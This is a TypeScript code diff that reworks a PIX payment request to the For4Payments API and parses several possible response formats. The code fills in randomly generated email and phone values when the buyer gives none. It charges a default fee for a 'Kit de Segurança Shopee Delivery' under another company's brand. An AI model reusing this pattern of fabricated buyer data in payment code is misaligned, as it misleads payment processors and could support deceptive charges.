@@ -51,24 +51,36 @@ export async function createPixPaymentDirect(data: PaymentRequest): Promise<Paym
   }
   
   // URL da API For4Payments
-  const apiUrl = 'https://app.for4payments.com.br/api/v1/pix/create';
+  const apiUrl = 'https://app.for4payments.com.br/api/v1/transaction.purchase';
   
   console.log(`Criando pagamento PIX diretamente via For4Payments`);
   
   try {
-    // Montar o payload da requisição
+    // Montar o payload da requisição conforme formato exigido pela API
+    const amount = data.amount || 84.70; // Valor padrão para o kit de segurança
+    const amountInCents = Math.round(amount * 100); // Converter para centavos
+    
+    // Processar CPF - remover caracteres não numéricos
+    const cpf = data.cpf.replace(/[^0-9]/g, '');
+    
     const payload = {
       name: data.name,
-      document: data.cpf.replace(/[^0-9]/g, ''), // Remover caracteres não numéricos
       email: data.email || generateRandomEmail(data.name),
+      cpf: cpf,
       phone: data.phone || generateRandomPhone(),
-      amount: data.amount || 84.70, // Valor padrão para o kit de segurança
-      description: "Kit de Segurança Shopee Delivery"
+      paymentMethod: "PIX",
+      amount: amountInCents,
+      items: [{
+        title: "Kit de Segurança",
+        quantity: 1,
+        unitPrice: amountInCents,
+        tangible: false
+      }]
     };
     
     console.log('Enviando requisição para For4Payments:', {
       ...payload,
-      document: payload.document.substring(0, 3) + '***' + payload.document.substring(payload.document.length - 2),
+      cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`,
     });
     
     // Configurar e enviar a requisição para a For4Payments API
@@ -90,18 +102,51 @@ export async function createPixPaymentDirect(data: PaymentRequest): Promise<Paym
     }
     
     // Processar a resposta
-    const result = await response.json();
-    console.log('Resposta da For4Payments recebida:', result);
+    const responseData = await response.json();
+    console.log('Resposta da For4Payments recebida:', responseData);
+    
+    // Extrair os campos relevantes conforme os possíveis formatos da resposta
+    // Baseado no código Python, a resposta pode vir em várias estruturas
+    let pixCode = null;
+    let pixQrCode = null;
+    let transactionId = responseData.id || responseData.transactionId || '';
+    
+    // Verificar campos no primeiro nível
+    if (responseData.pixCode) pixCode = responseData.pixCode;
+    else if (responseData.copy_paste) pixCode = responseData.copy_paste;
+    else if (responseData.code) pixCode = responseData.code;
+    else if (responseData.pix_code) pixCode = responseData.pix_code;
+    
+    if (responseData.pixQrCode) pixQrCode = responseData.pixQrCode;
+    else if (responseData.qr_code_image) pixQrCode = responseData.qr_code_image;
+    else if (responseData.qr_code) pixQrCode = responseData.qr_code;
+    else if (responseData.pix_qr_code) pixQrCode = responseData.pix_qr_code;
+    
+    // Verificar em estrutura aninhada (pix)
+    if (!pixCode && responseData.pix && typeof responseData.pix === 'object') {
+      const pixData = responseData.pix;
+      
+      if (pixData.code) pixCode = pixData.code;
+      else if (pixData.copy_paste) pixCode = pixData.copy_paste;
+      else if (pixData.pixCode) pixCode = pixData.pixCode;
+      
+      if (!pixQrCode) {
+        if (pixData.qrCode) pixQrCode = pixData.qrCode;
+        else if (pixData.qr_code_image) pixQrCode = pixData.qr_code_image;
+        else if (pixData.pixQrCode) pixQrCode = pixData.pixQrCode;
+      }
+    }
     
     // Validar a resposta
-    if (!result.pixCode || !result.pixQrCode) {
-      throw new Error('Resposta da For4Payments incompleta');
+    if (!pixCode || !pixQrCode) {
+      console.error('Resposta da For4Payments incompleta:', responseData);
+      throw new Error('Resposta da For4Payments não contém os dados de pagamento PIX necessários');
     }
     
     return {
-      id: result.id || result.pixId || '',
-      pixCode: result.pixCode,
-      pixQrCode: result.pixQrCode
+      id: transactionId,
+      pixCode: pixCode,
+      pixQrCode: pixQrCode
     };
   } catch (error: any) {
     console.error('Erro ao processar pagamento direto:', error);
